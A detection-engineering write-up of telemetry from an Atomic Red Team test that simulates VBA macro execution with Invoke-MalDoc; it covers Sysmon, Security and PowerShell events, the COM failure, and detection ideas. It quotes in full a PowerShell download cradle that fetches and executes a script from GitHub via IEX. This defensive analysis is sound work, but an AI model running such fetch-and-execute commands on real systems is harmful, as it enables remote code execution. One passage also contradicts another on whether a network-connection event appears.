# T1059.005-2: Visual Basic — Encoded VBS Code Execution

## Technique Context

T1059.005 (Visual Basic) covers adversary use of Visual Basic Script (VBS) or Visual Basic for Applications (VBA) macros to execute malicious code. This technique is central to many initial access campaigns — weaponized Office documents with embedded macros have been a dominant delivery vehicle for commodity malware and targeted intrusions alike. Attackers use VBA's deep integration with the Windows object model to download payloads, spawn processes, modify registry keys, and establish persistence, all from within a seemingly benign document. The technique is also relevant post-initial-access, when attackers encode and drop VBS scripts as part of execution chains that evade script-based controls.

Detection for this technique typically centers on Office application process spawning (WINWORD.EXE or EXCEL.EXE spawning cmd.exe or powershell.exe), VBA macro execution telemetry from Office audit logging, and PowerShell script block logging capturing IEX-based download cradles used to simulate or proxy macro behavior. Script-based execution frameworks like Invoke-MalDoc are commonly used by red teams to replicate macro execution in environments where Office is unavailable or in automated test frameworkes.

The ART test 2 for T1059.005 uses the Invoke-MalDoc PowerShell framework to simulate encoded VBS macro execution. It fetches the framework from GitHub via IEX, targets the Word application via COM, and attempts to inject and execute a VBA macro from a pre-staged macro code file.

## What This Dataset Contains

The core technique execution is visible across multiple channels. Security EID 4688 captures the key PowerShell process creation with the full command line:

```
"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroFile "C:\AtomicRedTeam\atomics\T1059.005\src\T1059.005-macrocode.txt" -officeProduct "Word" -sub "Exec"}
```

This is the complete attack execution string — TLS protocol enforcement, GitHub download cradle with `Invoke-WebRequest`, and invocation of the Invoke-MalDoc function against a pre-staged macro text file. The macro file path `C:\AtomicRedTeam\atomics\T1059.005\src\T1059.005-macrocode.txt` reveals the ART installation location.

The PowerShell channel contributes 149 events: 148 EID 4104 (Script Block Logging) and 1 EID 4100 (error). The majority of the 4104 events are framework boilerplate — `Set-StrictMode` wrappers, error category handlers, `$ErrorActionPreference = 'Continue'`, and the ART test framework itself (`Import-Module 'C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1' -Force`). The cleanup invocation is also logged: `Invoke-AtomicTest T1059.005 -TestNumbers 2 -Cleanup -Confirm:$false`.

Sysmon provides 31 events across 6 event types. EID 7 (Image Load) accounts for 17 events, predominantly Windows Defender-associated DLLs (`MpOAV.dll`, `mpclient.dll`) loaded into the PowerShell process — these are loaded as part of the standard process initialization chain, not defensive blocking. Named pipe creation (EID 17, 3 events) records pipes like `\PSHost.134180041174297047.5008.DefaultAppDomain.powershell`, confirming the PowerShell host process identity. Four process access events (EID 10) show inter-process inspection activity. One EID 3 (network connection) or EID 22 (DNS) event rounds out the network-adjacent activity.

A `whoami.exe` execution appears in both Sysmon EID 1 and Security EID 4688, run by the test framework as a pre/post-execution check. The parent process for the PowerShell attack execution is another PowerShell process (`powershell` without arguments), which is the ART test framework runner.

Compared to the defended version (27 sysmon, 10 security, 91 PowerShell events), this undefended dataset shows more PowerShell volume (149 vs 91) but fewer security events (4 vs 10). In the defended run, Defender generated additional telemetry around its blocking activity; without Defender, the process lifecycle events are cleaner — the IEX download and Invoke-MalDoc invocation proceed through to the COM interaction attempt without interruption.

## What This Dataset Does Not Contain

The technique ultimately fails due to Microsoft Office not being installed on the test system. The EID 4100 error event reflects the COM class factory failure: "Retrieving the COM class factory for component with CLSID {00000000-0000-0000-0000-000000000000} failed due to the following error: 80040154 Class not registered." As a result, this dataset contains no actual VBA macro execution telemetry — no Office application process spawning, no Document_Open or AutoOpen macro trigger events, and no child processes spawned by WINWORD.EXE.

There are no network connection events (Sysmon EID 3) confirming the GitHub download completed, though the DNS query event suggests the outbound request was attempted. The PowerShell script block logs do not surface the full Invoke-MalDoc function body in the samples, though with 148 EID 4104 events in the complete dataset, the function definition is almost certainly present in the unsurveyed portion.

## Assessment

This dataset captures the setup and invocation of a VBA macro simulation framework in a realistic environment where Office is absent. The Security EID 4688 command line is high-fidelity for the download cradle pattern — IEX combined with Invoke-WebRequest targeting a raw GitHub URL is a well-known detection target. The PowerShell channel provides the test framework context. The sysmon telemetry is process-heavy but technique-sparse, reflecting the COM failure before any substantive macro activity occurred.

For detection engineering purposes, this dataset is most useful for training on the download cradle + macro simulation pattern rather than actual VBA execution telemetry. The command line visibility in EID 4688 and Sysmon EID 1 is good, and the absence of process termination events with ACCESS_DENIED status (unlike the defended version) cleanly demonstrates what an unblocked execution path looks like up to the COM failure point.

## Detection Opportunities Present in This Data

1. **EID 4688 / Sysmon EID 1 command line detection**: The process creation for PowerShell includes the literal string `Invoke-MalDoc` and `Invoke-MalDoc.ps1` in the command line, alongside `IEX` and a raw GitHub URL — all three elements in combination are a strong indicator.

2. **IEX + IWR + raw GitHub URL pattern in EID 4104 / EID 4688**: The combination of `Invoke-WebRequest` (or `iwr`), `InvokeExpression` (or `IEX`), and a `raw.githubusercontent.com` URL targeting an attack framework path is detectable in both the process command line and script block logs.

3. **Sysmon EID 17 named pipe creation from PowerShell**: Named pipes matching `\PSHost.*DefaultAppDomain.powershell` created by PowerShell processes that also show suspicious command lines can serve as a corroborating process identity signal.

4. **Sysmon EID 7 — Defender DLL loads in PowerShell without Office context**: The MpOAV.dll and mpclient.dll loads into powershell.exe (rather than an Office application) is unusual and could be flagged as unexpected DLL loading context for macro simulation.

5. **Sequential whoami.exe executions from PowerShell parent**: The test framework pattern of running `whoami.exe` immediately before and after technique execution, with PowerShell as parent, appears in EID 4688 and can serve as a timing-based test framework fingerprint in controlled environments.
